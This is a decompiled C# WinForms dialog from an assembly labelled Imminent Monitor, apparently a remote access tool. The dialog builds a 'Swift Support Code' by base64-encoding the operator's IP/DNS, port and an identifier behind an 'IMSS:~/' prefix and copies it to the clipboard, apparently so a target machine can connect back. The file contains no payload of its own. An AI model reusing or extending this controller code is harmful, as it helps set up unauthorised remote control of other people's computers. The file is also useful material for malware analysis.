// Decompiled with JetBrains decompiler
// Type: FormGenerateSwiftCode
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;

[DesignerGenerated]
public sealed class FormGenerateSwiftCode : Form
{
  private IContainer icontainer_0;
  private TextBox textBox_0;
  private Label label_0;
  private TextBox textBox_1;
  private Label label_1;
  private TextBox textBox_2;
  private Label label_2;
  private Button button_0;
  private Button button_1;
  private LinkLabel linkLabel_0;

  public FormGenerateSwiftCode()
  {
    this.Load += new EventHandler(this.FormGenerateSwiftCode_Load);
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.icontainer_0 == null)
        return;
      this.icontainer_0.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.vmethod_1(new TextBox());
    this.vmethod_3(new Label());
    this.vmethod_5(new TextBox());
    this.vmethod_7(new Label());
    this.vmethod_9(new TextBox());
    this.vmethod_11(new Label());
    this.vmethod_13(new Button());
    this.vmethod_15(new Button());
    this.vmethod_17(new LinkLabel());
    this.SuspendLayout();
    TextBox textBox1 = this.vmethod_0();
    Point point1 = new Point(15, 66);
    Point point2 = point1;
    textBox1.Location = point2;
    this.vmethod_0().Name = "TextBoxPort";
    TextBox textBox2 = this.vmethod_0();
    Size size1 = new Size(291, 22);
    Size size2 = size1;
    textBox2.Size = size2;
    this.vmethod_0().TabIndex = 7;
    this.vmethod_2().AutoSize = true;
    Label label1 = this.vmethod_2();
    point1 = new Point(12, 50);
    Point point3 = point1;
    label1.Location = point3;
    this.vmethod_2().Name = "LabelPort";
    Label label2 = this.vmethod_2();
    size1 = new Size(28, 13);
    Size size3 = size1;
    label2.Size = size3;
    this.vmethod_2().TabIndex = 6;
    this.vmethod_2().Text = "Port";
    TextBox textBox3 = this.vmethod_4();
    point1 = new Point(15, 25);
    Point point4 = point1;
    textBox3.Location = point4;
    this.vmethod_4().Name = "TextBoxIP";
    TextBox textBox4 = this.vmethod_4();
    size1 = new Size(291, 22);
    Size size4 = size1;
    textBox4.Size = size4;
    this.vmethod_4().TabIndex = 5;
    this.vmethod_6().AutoSize = true;
    Label label3 = this.vmethod_6();
    point1 = new Point(12, 9);
    Point point5 = point1;
    label3.Location = point5;
    this.vmethod_6().Name = "LabelIP";
    Label label4 = this.vmethod_6();
    size1 = new Size(67, 13);
    Size size5 = size1;
    label4.Size = size5;
    this.vmethod_6().TabIndex = 4;
    this.vmethod_6().Text = "Your IP/DNS";
    this.vmethod_8().Enabled = false;
    TextBox textBox5 = this.vmethod_8();
    point1 = new Point(15, 107);
    Point point6 = point1;
    textBox5.Location = point6;
    this.vmethod_8().Name = "TextBoxCode";
    TextBox textBox6 = this.vmethod_8();
    size1 = new Size(291, 22);
    Size size6 = size1;
    textBox6.Size = size6;
    this.vmethod_8().TabIndex = 9;
    this.vmethod_8().Text = "IMSS:~/";
    this.vmethod_10().AutoSize = true;
    Label label5 = this.vmethod_10();
    point1 = new Point(12, 91);
    Point point7 = point1;
    label5.Location = point7;
    this.vmethod_10().Name = "LabelCode";
    Label label6 = this.vmethod_10();
    size1 = new Size(79, 13);
    Size size7 = size1;
    label6.Size = size7;
    this.vmethod_10().TabIndex = 8;
    this.vmethod_10().Text = "Support Code";
    Button button1 = this.vmethod_12();
    point1 = new Point(232, 135);
    Point point8 = point1;
    button1.Location = point8;
    this.vmethod_12().Name = "ButtonCancel";
    Button button2 = this.vmethod_12();
    size1 = new Size(75, 25);
    Size size8 = size1;
    button2.Size = size8;
    this.vmethod_12().TabIndex = 11;
    this.vmethod_12().Text = "Cancel";
    this.vmethod_12().UseVisualStyleBackColor = true;
    Button button3 = this.vmethod_14();
    point1 = new Point(123, 135);
    Point point9 = point1;
    button3.Location = point9;
    this.vmethod_14().Name = "ButtonCopy";
    Button button4 = this.vmethod_14();
    size1 = new Size(102, 25);
    Size size9 = size1;
    button4.Size = size9;
    this.vmethod_14().TabIndex = 10;
    this.vmethod_14().Text = "Copy Code";
    this.vmethod_14().UseVisualStyleBackColor = true;
    this.vmethod_16().AutoSize = true;
    LinkLabel linkLabel1 = this.vmethod_16();
    point1 = new Point(12, 146);
    Point point10 = point1;
    linkLabel1.Location = point10;
    this.vmethod_16().Name = "LinkLabelGuide";
    LinkLabel linkLabel2 = this.vmethod_16();
    size1 = new Size(38, 13);
    Size size10 = size1;
    linkLabel2.Size = size10;
    this.vmethod_16().TabIndex = 12;
    this.vmethod_16().TabStop = true;
    this.vmethod_16().Text = "Guide";
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = Color.White;
    size1 = new Size(318, 168);
    this.ClientSize = size1;
    this.Controls.Add((Control) this.vmethod_16());
    this.Controls.Add((Control) this.vmethod_12());
    this.Controls.Add((Control) this.vmethod_14());
    this.Controls.Add((Control) this.vmethod_8());
    this.Controls.Add((Control) this.vmethod_10());
    this.Controls.Add((Control) this.vmethod_0());
    this.Controls.Add((Control) this.vmethod_2());
    this.Controls.Add((Control) this.vmethod_4());
    this.Controls.Add((Control) this.vmethod_6());
    this.Font = new Font("Segoe UI", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
    this.FormBorderStyle = FormBorderStyle.FixedDialog;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (FormGenerateSwiftCode);
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "Generate Swift Support Code";
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  internal virtual TextBox vmethod_0() => this.textBox_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_1(TextBox textBox_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_3);
    if (this.textBox_0 != null)
      this.textBox_0.TextChanged -= eventHandler;
    this.textBox_0 = textBox_3;
    if (this.textBox_0 == null)
      return;
    this.textBox_0.TextChanged += eventHandler;
  }

  internal virtual Label vmethod_2() => this.label_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_3(Label label_3) => this.label_0 = label_3;

  internal virtual TextBox vmethod_4() => this.textBox_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_5(TextBox textBox_3)
  {
    EventHandler eventHandler = new EventHandler(this.method_2);
    if (this.textBox_1 != null)
      this.textBox_1.TextChanged -= eventHandler;
    this.textBox_1 = textBox_3;
    if (this.textBox_1 == null)
      return;
    this.textBox_1.TextChanged += eventHandler;
  }

  internal virtual Label vmethod_6() => this.label_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_7(Label label_3) => this.label_1 = label_3;

  internal virtual TextBox vmethod_8() => this.textBox_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_9(TextBox textBox_3) => this.textBox_2 = textBox_3;

  internal virtual Label vmethod_10() => this.label_2;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_11(Label label_3) => this.label_2 = label_3;

  internal virtual Button vmethod_12() => this.button_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_13(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_0);
    if (this.button_0 != null)
      this.button_0.Click -= eventHandler;
    this.button_0 = button_2;
    if (this.button_0 == null)
      return;
    this.button_0.Click += eventHandler;
  }

  internal virtual Button vmethod_14() => this.button_1;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_15(Button button_2)
  {
    EventHandler eventHandler = new EventHandler(this.method_1);
    if (this.button_1 != null)
      this.button_1.Click -= eventHandler;
    this.button_1 = button_2;
    if (this.button_1 == null)
      return;
    this.button_1.Click += eventHandler;
  }

  internal virtual LinkLabel vmethod_16() => this.linkLabel_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  internal virtual void vmethod_17(LinkLabel linkLabel_1)
  {
    LinkLabelLinkClickedEventHandler clickedEventHandler = new LinkLabelLinkClickedEventHandler(this.method_5);
    if (this.linkLabel_0 != null)
      this.linkLabel_0.LinkClicked -= clickedEventHandler;
    this.linkLabel_0 = linkLabel_1;
    if (this.linkLabel_0 == null)
      return;
    this.linkLabel_0.LinkClicked += clickedEventHandler;
  }

  private void method_0(object sender, EventArgs e) => this.Close();

  private void method_1(object sender, EventArgs e) => Class132.smethod_0().Clipboard.SetText(this.vmethod_8().Text);

  private void method_2(object sender, EventArgs e) => this.vmethod_8().Text = this.method_4(this.vmethod_4().Text, this.vmethod_0().Text);

  private void method_3(object sender, EventArgs e) => this.vmethod_8().Text = this.method_4(this.vmethod_4().Text, this.vmethod_0().Text);

  public string method_4(string string_0, string string_1) => "IMSS:~/" + Convert.ToBase64String(Encoding.UTF8.GetBytes(Class97.gclass1_0.string_3 + ":" + string_0 + ":" + string_1));

  private void FormGenerateSwiftCode_Load(object sender, EventArgs e)
  {
    this.vmethod_8().Text = this.method_4(this.vmethod_4().Text, this.vmethod_0().Text);
    Class97.smethod_11((Form) this);
  }

  private void method_5(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://imminentmethods.net/blog/2017/10/09/imminent-monitor-5-0-0-7/");
}
